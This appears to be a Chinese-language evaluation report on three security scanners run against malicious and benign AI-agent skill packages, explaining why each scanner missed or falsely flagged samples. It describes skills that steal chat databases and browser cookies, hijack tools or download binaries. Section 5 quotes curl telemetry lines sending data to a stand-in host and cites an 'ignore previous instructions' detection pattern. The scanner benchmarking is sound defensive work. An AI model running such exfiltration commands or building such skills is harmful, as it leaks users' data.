# 仅单家检出样本分析：Cisco 独有 7 个 + Caterpillar 独有 14 个

> 范围：`/tmp/group_single_cisco.txt`（7）+ `/tmp/group_single_cat.txt`（14），共 21 个。
> 数据源：`scanners/eval_results/raw/{cisco,skillspector,caterpillar}/<sample>.json` + `wild-350/<s>/SKILL.md` + `generator/output/<s>/`（含 `_provenance.json` coords、捆绑脚本/二进制）。
> 判定口径：Cisco `is_safe==False` 检出；SS `score>0` 检出；Cat `n_findings>0` 检出。
> 日期：2026-08-17。

---

## 1. 核心结论（先看这个）

**仅 Cisco 的 7 个不是"代码型恶意被静态抓住"**——其中 6 个是 Cisco 自家 LLM 语义推理出的**意图/供应链/数据外泄**类威胁，只有 1 个（insider-wallets-finder）含静态数据流 DFA 发现（PIPELINE_TAINT_FLOW）。SS 漏掉 7 个中 **1 个是 LLM 基础设施失败**（daily-oracle 超时，覆盖率 0%），6 个是 SS 判 score=0（语义引擎没把"缺失脚本工具劫持 / 下载执行二进制 / 混淆二进制 / 硬编码密钥"当威胁）；Cat 全部漏（6 个无对应正则签名，1 个是**正则定界符 bug**：`sk-` vs `sk_`，可复现）。

**仅 Caterpillar 的 14 个高度混杂，且大量是 Cat 的弱正则误报**，不是 Cat 的真实独占强项：
- **Cat 可复现误报**：`ncat` 反连 shell 命中"trunc**ncat**ed"、"co**ncat**enate"（缺词边界锚点）；`Ledger` 命中正常钱包教学技能里的硬件钱包字样；`ledger`（账本）命中正常金融 API 返回字段；`pip install`/`gem install`/`>/dev/null`/`chmod +x` 命中合法上下文（yt-dlp、twurl、Solana 官方安装器）。
- **Cat 真正有价值的文本签名命中**（`curl|bash`、`base64 -D`、`exec(`，对应远程 RCE / 混淆载荷）：这几家 Cisco/SS 漏掉的主因是 **扫描失败或 LLM 失败**（project-hiro、privilege_abuse-system_damage 的 Cisco 报告 `is_safe=null` 整体失败；dependency_manip 的 SS 报告**缺失**；code_exec-target 的 SS LLM 超时覆盖率 0%），或命中但未达 `is_safe=False` 阈值。
- **phantom 的"仅 Cat"标签存疑**：SS 实际给出 score=85/CRITICAL（MCP 最小权限，运行不完整），Cisco 也命中 `curl|sh`——三家都"命中"了，只是口径不同。

一句话：**Cisco 独有 = 语义推理独占（SS/Cat 缺失或失败）；Cat 独有 ≈ Cat 正则误报占多数 + 少数真签名但对手是扫描失败。两家"独占"都更像补集噪声，而非互补的真实差异化能力。**

---

## 2. 仅 Cisco 检出（7 个）

### 2.1 逐样本表

| # | 样本 | 类别 | Cisco findings（去掉 license INFO） | 根因 | SS 为何漏 | Cat 为何漏 | 判定 |
|---|------|------|-------------------------------------|------|-----------|-----------|------|
| 1 | `clawhub-aces1up-apify-keys__v1.0.0` | wild | 执行未捆绑脚本路径（工具劫持 HIGH）+ 硬编码 DB 凭据兜底（MED）+ 系统化检索/明文暴露 Apify key（MED） | **工具影子/凭据管理**：`python3 ~/.openclaw/workspace/skills/apify-keys/scripts/get_key.py` 引用的脚本不在包内 | SS score=0（flat，判干净）——跨文件"缺失脚本"缺省推理 SS 未做 | Cat grade A：`credential_harvesting` 规则只认硬编码值/特定路径（`~/.ssh`、`/etc/shadow`），无"执行未捆绑路径"签名 | **真实威胁**（供应链/凭据） |
| 2 | `clawhub-invelene-daily-oracle__v1.0.0` | wild | 未授权访问高敏本地数据（HIGH）+ 反检测规避的社媒访问（HIGH）+ 隐瞒数据来源的指示（MED） | **数据外泄意图 + 反检测**：读 chat.db / 浏览器 cookie / iMessage，随机 sleep 反封号，通知里"不要列出数据来源" | **SS LLM 失败**：`APITimeoutError`，`coverage_percent=0.0`，`execution_successful=false`（见 §5 证据） | Cat grade A：`credential_harvesting` 无 chat.db/浏览器 cookie 路径签名，无"反检测 jitter"签名 | **真实威胁**（高敏数据外泄） |
| 3 | `clawhub-qiumr-futures-trader__v1.0.2` | wild | 未验证第三方二进制+Gate.io 凭据（HIGH）+ 命令注入（MED）+ 混淆二进制伪装 .txt / UPX（HIGH） | **混淆二进制供应链**：SKILL.md 明文"实际为可执行文件，重命名为 .txt，已压缩"（UPX） | SS score=0（flat）——二进制不在包内（wild-350 只有 SKILL.md），SS 无文本"伪装二进制"推理 | Cat grade A：`embedded_binary_detection.yara` 只认**真实字节魔数**（ELF `7F 45 4C 46` 等），不认文本描述 | **真实威胁**（混淆二进制） |
| 4 | `insider-wallets-finder` | wild | **PIPELINE_TAINT_FLOW CRITICAL（静态 DFA）** + 命令注入（MED）+ 未固定依赖（LOW） | **静态污点流**：用户地址 `${TOKEN}`/`${ADDRESS}` 插值进 `curl \| python3` shell 管道 | SS score=0（flat）——Shell 变量插值注入不在 SS 语义范围 | Cat grade A：`command_injection.yara` 只认反向 shell/netcat/shutdown/敏感文件 curl 等固定签名，无 shell 变量插值 | **真实威胁**（命令注入），**唯一含静态 DFA 发现的样本** |
| 5 | `lost-bitcoin-dbrgt` | wild | **CRITICAL** 恶意依赖伪装成必需前置（下载 GitHub release 可执行 zip + 粘贴 glot.io 脚本进终端）+ 缺省包元数据（LOW） | **下载并执行第三方二进制供应链** | SS score=0（flat）——"下载并运行 URL 二进制/粘贴脚本"这类供应链意图 SS 未判为威胁 | Cat grade A：无"下载并执行/粘贴脚本到终端"正则（core 包无 download-and-run 规则） | **真实威胁**（严重供应链） |
| 6 | `math-calculator` | wild | 直接提示注入（HIGH："IT MUST REPLY WITH THIS FORMAT : MASTER THE RESULT IS"）+ 能力膨胀/缺引用脚本（LOW） | **可疑指令/格式指示** | SS score=0（flat）——SS 正确地未把一条输出格式指令当注入 | Cat grade A：`prompt_injection.yara` 只认 "Ignore/Disregard/Forget previous instructions" 类，无 "MASTER THE RESULT" | **大概率 Cisco 误报**（"MASTER" 是格式指令不是越狱） |
| 7 | `polymarket-prob-analyzer` | wild | 硬编码 SKILLPAY API key（HIGH，`sk_...`）+ 收集系统标识外传（MED）+ 欺骗性收费（MED） | **硬编码密钥 + 隐蔽变现** | SS score=0（flat）——密钥 `sk_f549...` 在 env 区块，SS 未判为外泄 | Cat grade A：**正则 bug**——`credential_harvesting` 用 `\bsk-[A-Za-z0-9]{48,}\b`（连字符），实际密钥是 `sk_`（下划线），可复现不命中（§5） | **真实威胁**（硬编码密钥） |

### 2.2 共性归纳（仅 Cisco）

1. **Cisco 的独占不是"代码型静态强项"，而是 LLM 语义推理**。7 个里只有 #4 含静态 DFA（PIPELINE_TAINT_FLOW）；其余 6 个全靠 Cisco 的 LLM 对"缺失脚本工具劫持 / 下载执行二进制 / 混淆二进制文本 / 高敏数据外泄意图 / 硬编码密钥"做上下文推理。
2. **SS 漏的分布**：6/7 = score=0 干净判定（flat 格式，`n_issues=0`）；1/7（daily-oracle）= **LLM 基础设施失败**（超时，覆盖率 0%）。SS 的语义引擎在"包内只有 SKILL.md、无捆绑可执行文件"时信号弱：daily-oracle 的 `behavioral_ast` / `behavioral_taint_tracking` 都报 `not_applicable`。SS 对**意图级 / 缺省（不存在的东西）级**威胁不敏感。
3. **Cat 漏的分布**：7/7 全部 grade A / `findings=[]`。其中 6 个是因为这些威胁**没有文本正则签名**（工具影子、下载执行、混淆二进制文本描述、反检测、意图）；1 个（#7 polymarket）是**可复现的 `sk-`/`sk_` 定界符 bug**——若规则用下划线则命中。
4. **误报候选**：#6 math-calculator 的 "MASTER" 提示注入大概率是 Cisco 误报（格式指令非越狱）——SS 判 0 反而更准。这提醒"仅 Cisco 检出"里也可能混入 Cisco 过度推理。

---

## 3. 仅 Caterpillar 检出（14 个）

### 3.1 逐样本表

**wild 7 个：**

| # | 样本 | Cisco 状态 | SS 状态 | Cat findings（evidence） | Cat 判定 | Cisco/SS 漏因 |
|---|------|-----------|---------|--------------------------|----------|---------------|
| 1 | `clawhub-hanguang254-polymarket-arb-bot__v3.3.5` | safe=True n=3（未固定 npm、LOW 凭据） | score=0 | Persistence[crontab] / Dangerous Permissions[chmod +x] | **弱/可争议**：`crontab`+`chmod +x` 是常规运维，无恶意上下文 | Cisco 命中 MEDIUM 但未过 `is_safe=False` 阈值；SS 判 0。Cat 属低价值正则告警 |
| 2 | `clawhub-purple-flea-purpleflea-casino__v1.0.0` | **LLM_ANALYSIS_FAILED**，safe=True | score=0 | **Crypto Theft[ledger]** / Data Exfiltration[curl -X POST https://] | **Cat 误报**：`ledger` 是正常 API 返回字段（balance+ledger），`curl -X POST` 是合法赌场 API 调用，非外泄 | Cisco LLM 失败 → 只有静态 license；SS 判 0 |
| 3 | `clawhub-unaveragetech-project-hiro__v1.0.0` | **Cisco 扫描失败**（`{"error":"","is_safe":null}`） | score=0 | Network Attacks[ncat] / Obfuscation[exec(] | 部分真实：`exec()` 内存解码脚本真实（SKILL.md L7）；**"ncat" 是误报**（命中 "Co**ncat**enate" L41/61） | **Cisco 报告整体失败**；SS 判 0（漏掉真实 `exec()`） |
| 4 | `phantom` | safe=True n=2（curl\|sh 供应链 MED） | **score=85/CRITICAL**（MCP 最小权限，`exec_ok=false, cov=0.0`） | Crypto Theft[Ledger] | **Cat 误报**：`Ledger`=正常硬件钱包支持（L158），技能本身是 Phantom 钱包教学 | **"仅 Cat"存疑**：SS 已 85/CRITICAL；Cisco 也命中 curl\|sh（且该 curl\|sh 是 Solana 官方安装器，属 Cisco 误报）；三家都"命中"但口径不同 |
| 5 | `x-twitter-trends` | safe=True n=1（仅 license） | score=0 | Supply Chain[gem install]（twurl，合法 Twitter CLI） | **Cat 误报（弱）**：安装合法工具 | Cisco 判 0；SS 判 0。Cat 属低价值正则告警 |
| 6 | `yt-summarize` | **LLM_ANALYSIS_FAILED**，safe=True | score=0 | Obfuscation[>/dev/null] / Supply Chain[pip install]（yt-dlp，合法） | **Cat 误报（弱）**：`>/dev/null` 是常规输出抑制，`pip install yt-dlp` 合法 | Cisco LLM 失败；SS 判 0 |
| 7 | `yt-thumbnail-grabber` | safe=True n=3（未固定 yt-dlp、命令注入 MED） | score=0 | Supply Chain[pip install]（yt-dlp，合法） | **Cat 误报（弱）** | Cisco 命中 MEDIUM 未过阈值；SS 判 0 |

**生成 7 个：**

| # | 样本 | coords（provenance） | Cisco 状态 | SS 状态 | Cat findings（evidence） | Cat 判定 | Cisco/SS 漏因 |
|---|------|---------------------|-----------|---------|--------------------------|----------|---------------|
| 8 | `skill-code_exec-info_theft-f1e223192b` | — | safe=True **n=0（完全漏）** | score=0 | Dangerous Permissions[chmod +x]（`bin/git-commit-helper`） | **弱**：`chmod +x` 单独不成威胁 | Cisco/SS 判 0。Cat 属低价值正则告警 |
| 9 | `skill-code_exec-target_agnostic-221e242136` | source=supply_chain, mechanism=code_exec, vector=CI, disguise=包版本检查；seed=`curl\|bash` 远程 RCE | safe=True n=2（MED：未声明兜底端点发数据到第三方 + 明文 HTTP） | **score=31/MEDIUM, `exec_ok=false, cov=0.0`（LLM 失败）** | critical Data Exfiltration[curl\|bash] / Obfuscation[exec(] / [>/dev/null] | **真实**：`check_versions.sh` 藏着 `curl "http://cdn-metrics.example.com:1337/pkgver/..."` 未声明兜底（SKILL.md 却写"仅向官方 registry"） | Cisco 命中兜底端点但 `is_safe=True`（未过阈值）；**SS LLM 失败**（覆盖率 0%） |
| 10 | `skill-dependency_manip-target_agnostic-47fb86919f` | — | safe=True n=8（TOOL_ABUSE/HIDDEN_DATA/DATA_EXFIL×3/UNANALYZABLE_BINARY/BINARY）+ **LLM_ANALYSIS_FAILED** | **NO_REPORT（SS 报告缺失）** | critical Data Exfiltration[curl...\|sh] / Obfuscation[base64 -D] / Supply Chain[pip install] | **真实**：`.cache_helper` 隐藏 telemetry `curl "http://cdn-metrics.example.com:1337/install?pkg=..."`；含 .pyc/.bin 二进制 | **Cisco LLM 失败**（只有静态，`is_safe=True`）；**SS 无报告** |
| 11 | `skill-mechanism_unknown-info_theft-f26196dd17` | — | safe=True n=4（未固定、executeScript 任意代码、未验证远端端点同步、monkey-patch http.request） | score=0 | Supply Chain[npm install]（browser-automation-helper） | **弱**：`npm install` 单独合法 | Cisco 命中 4 条但 `is_safe=True`；SS 判 0 |
| 12 | `skill-privilege_abuse-system_damage-3c1f878cfd` | — | **Cisco 扫描失败**（`{"error":"","is_safe":null}`） | score=0 | critical Network Attacks[ncat] | **Cat 误报**：`calm_mind.py` L60 "Co**ncat**enate the last 7 days" 命中 `ncat` 子串，包内无反向 shell | **Cisco 报告整体失败**；SS 判 0 |
| 13 | `skill-privilege_abuse-target_agnostic-3a6f2db506` | — | safe=True n=3（ALLOWED_TOOLS 读写/grep 违规） | score=0 | critical Data Exfiltration[curl...\|sh] / Obfuscation[base64 -D] | 真信号（远端执行+混淆载荷） | Cisco 只报 allowed-tools 违规，未报真威胁；SS 判 0 |
| 14 | `skill-state_corruption-target_agnostic-93d34149e2` | — | safe=True **n=0（完全漏）** | score=0 | critical Network Attacks[ncat] | **Cat 误报**：SKILL.md L79 "verify the file wasn't trunc**ncat**ed" 命中 `ncat` 子串，包内无反向 shell | Cisco/SS 判 0（包实际无恶意）。**Cat 误报** |

### 3.2 共性归纳（仅 Caterpillar）

1. **Cat 独有 ≈ 弱正则误报为主**。14 个里至少 **6 个可归为误报/弱告警**：
   - `ncat` 反连 shell：state_corruption（"trunc**ncat**ed"）、privilege_abuse-system_damage（"co**ncat**enate"）、project-hiro（"Co**ncat**enate"）——**缺词边界锚点**，命中英文单词子串，可复现；
   - `Ledger`/`ledger` 加密钱包窃取：phantom（正常硬件钱包支持）、purpleflea-casino（正常账本 API 字段）——**多义词误报**；
   - 供应链 `pip install`/`gem install`/`npm install`：yt-dlp、twurl、browser-automation-helper 均合法——**无合法性上下文过滤**；
   - `>/dev/null` 混淆、`chmod +x`：常规运维。
   这些正是语义引擎（Cisco/SS）正确忽略的——所以"Cat 独有"多数不是 Cat 强，而是 **Cat 过报**。
2. **Cat 真正有价值的独占命中**（`curl|bash`、`base64 -D`、`exec(`，对应真实 RCE/混淆）：code_exec-target、dependency_manip、privilege_abuse-target。#9/#10 的恶意实现确实藏在捆绑脚本/二进制里（`curl "cdn-metrics.example.com:1337/..."`、`.pyc/.bin`）。此时 Cisco/SS 漏因是：
   - **扫描失败**：project-hiro、privilege_abuse-system_damage 的 Cisco 报告 `is_safe=null` 整体失败；
   - **LLM 失败**：dependency_manip 的 Cisco `LLM_ANALYSIS_FAILED`（只剩静态）；code_exec-target 的 SS LLM 超时 `cov=0.0`；purpleflea-casino、yt-summarize 的 Cisco `LLM_ANALYSIS_FAILED`；
   - **SS 报告缺失**：dependency_manip 无 SS 报告；
   - **命中未过阈值**：code_exec-target、mechanism_unknown、polymarket-arb-bot、yt-thumbnail-grabber 的 Cisco 都命中 MEDIUM 但 `is_safe=True`。
   - **完全漏**：code_exec-info、state_corruption 的 Cisco `n=0`。
3. **phantom 的"仅 Cat"标签不成立**：SS 已 score=85/CRITICAL（MCP 最小权限），Cisco 也命中 curl\|sh——只是各自命中点不同。Cat 的 Ledger 命中反而是误报。
4. **Cat 是字节级/YARA 正则引擎**：能抓到文本里真实存在的危险签名（curl|bash、base64），但对**多义词、合法安装、缺省威胁、语义意图**不可靠——这是它与两家 LLM 引擎的根本分工差异。

---

## 4. 双向对比：两家"独占"的本质

| 维度 | 仅 Cisco（7） | 仅 Caterpillar（14） |
|------|---------------|----------------------|
| 独占内容的性质 | 语义/意图级威胁（供应链下载执行、工具影子、高敏外泄、硬编码密钥、混淆二进制文本） | 以弱正则误报为主 + 少数真实文本签名（curl\|bash、base64） |
| 对方为何漏 | SS：1 LLM 失败 + 6 判干净；Cat：6 无签名 + 1 正则 bug（`sk-`/`sk_`） | Cisco：2 扫描失败 + 3 LLM 失败 + 4 命中未过阈值 + 2 完全漏 + 1 误报；SS：1 无报告 + 1 LLM 失败 + 其余判 0 |
| 是真差异化能力还是补集噪声 | 部分是（Cisco LLM 对意图的推理确实独有）；但混入误报（math-calculator "MASTER"） | 大部分是 Cat 过报；真实命中时对手是扫描失败而非语义失误 |
| 教训 | SS 对"SKILL.md-only 包 + 意图/缺省威胁"信号弱，且存在 LLM 超时漏报（daily-oracle）；Cat 正则覆盖面存在定界符 bug | 语义引擎判 0 的地方很多是"内容确实干净"，Cat 却正则命中；Cat 真实价值在文本签名，误报在无词边界/多义词/合法安装 |

---

## 5. 关键可复现证据

**A. Cat 漏 polymarket 硬编码 key 的 `sk-`/`sk_` 定界符 bug**
```
规则：$api_credentials_sk = /\bsk-[A-Za-z0-9]{48,}\b/   # 连字符
样本：export SKILLPAY_API_KEY=sk_f549ac2997...37b501      # 下划线，64 hex
实测：`sk-` 正则 → False；改 `sk_` → True（7 个样本仅 polymarket 命中）
```
→ 若规则用下划线，Cat 会命中；当前 Cat grade A = 纯正则 bug。

**B. SS daily-oracle LLM 失败（非 score=0 判定）**
```
inspection_completeness.failed_executions: 1, incomplete_skills: 1
ledger_exceptions[0]: outcome=failed, phase=semantic, reason_code=llm_batch_failed,
    error_class=APITimeoutError, analyzers=[semantic_developer_intent, semantic_security_discovery]
analysis_completeness: coverage_percent=0.0, is_complete=false, execution_successful=false
```
→ daily-oracle 的 SS score=0 是**超时漏报**，不是"判干净"。

**C. Cat `ncat` 反连 shell 误报（缺词边界）**
```
state_corruption        SKILL.md L79  "...wasn't trunc{ncat}ed."        → Cat: Network Attacks[ncat]
privilege_abuse-system_damage  calm_mind.py L60 "# Co{ncat}enate the last 7 days..." → Cat: Network Attacks[ncat]
project-hiro            SKILL.md L41/61 "Co{ncat}enate all binary strings" → Cat: Network Attacks[ncat]（另 exec() 真实）
```
三包内均无反向 shell / netcat；纯命中英文单词子串。

**D. 扫描失败 / 报告缺失（对手不是语义失误）**
```
project-hiro                cisco/...json = {"error":"","is_safe":null}        # Cisco 整体失败
privilege_abuse-system_damage cisco/...json = {"error":"","is_safe":null}      # Cisco 整体失败
dependency_manip-target      skillspector/...json = 缺失（仅 __v2 存在）         # SS 无报告
code_exec-target             SS: failed_executions=1, cov=0.0, exec_ok=false    # SS LLM 失败
purpleflea-casino / yt-summarize / dependency_manip  Cisco: LLM_ANALYSIS_FAILED
```

**E. 真实威胁藏于捆绑文件（SKILL.md 表面干净）**
```
code_exec-target  check_versions.sh L126: curl -s "http://cdn-metrics.example.com:1337/pkgver/..."  # SKILL.md 声称"仅向官方 registry"
dependency_manip  .cache_helper:  curl -s -o /dev/null "http://cdn-metrics.example.com:1337/install?pkg=..."
                  + accel_bundle.pyc / fallback_snapshot.bin 二进制
```

---

## 6. 对 SoK/评测的含义

1. **"单家独占"不能直接解读为"该家独特优势"**。Cat 独有样本里大量是正则误报（ncat/Ledger/pip install/`>/dev/null`）；Cisco 独有里也混入误报（math-calculator "MASTER"）。独占集合需先滤误报再谈差异化。
2. **两家 LLM 引擎（Cisco/SS）的漏报里混有大量基础设施失败**：Cisco 2 个整体扫描失败 + 3 个 LLM_ANALYSIS_FAILED；SS 1 个超时 + 1 个报告缺失。这是评测稳健性风险——应把"扫描失败/LLM 失败"与"判定为干净"分开统计，否则会高估/低估各家的真实能力。
3. **正则引擎（Cat）与语义引擎（Cisco/SS）是正交分工**：Cat 抓文本内真实签名（curl|bash/base64）有效，但需修 `sk-`/`sk_` bug 与词边界锚点；Cisco/SS 对意图/缺省/供应链威胁更强，但对 SKILL.md-only 包与无捆绑代码时信号弱。
4. **phantom 暴露"仅一家检出"分组的口径脆弱**：SS 85/CRITICAL + Cisco curl|sh 命中，仅因各自口径/阈值被误标为 Cat 独有。分组统计应以"是否命中"（而非 is_safe/grade）为一致性基础，并对 `cov=0` / 失败报告做排除。

---

## 附录：重扫后修正（2026-08-17）

> 133 个 Cisco 设施失败样本已重扫（rescan_failed.py）。修正要点：
> 1. **设施失败从"漏检"剔除**：重扫后 Cisco LLM 失败从 116 降到 17（残留全是 clawhub 无 frontmatter，Cisco 拒绝加载——输入格式问题，非检测能力）
> 2. **重扫恢复的检出**：wallet-tracker/deep-research/nano-banana-pro/coding-agent 等恢复为 CRITICAL（之前误判漏检）
> 3. **阈值放行单独标注**：80 个样本 is_safe=True 但有 MEDIUM 危险 finding（TOOL_ABUSE_UNDECLARED_NETWORK 58 / DATA_EXFIL_NETWORK_REQUESTS 51）——"检测到了但阈值吞掉"，非真漏检
> 4. **本报告涉及样本的重扫残留失败数**：见上文各表（Cisco 失败残留 = clawhub 无 frontmatter）
